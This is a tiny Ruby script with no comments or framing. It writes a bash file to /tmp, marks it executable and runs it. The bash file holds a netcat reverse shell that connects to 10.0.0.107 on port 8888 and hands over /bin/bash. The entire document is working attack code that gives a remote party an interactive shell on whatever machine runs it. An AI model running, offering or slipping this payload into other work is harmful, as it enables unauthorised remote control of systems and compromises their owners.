#!/usr/bin/env ruby


file1 = File.new("/tmp/file1.sh", "w")

file1.chmod( 0755 )

File.write("/tmp/file1.sh", "#!/bin/bash\nnc -nv 10.0.0.107 8888 -e /bin/bash" )

exec("bash /tmp/file1.sh")

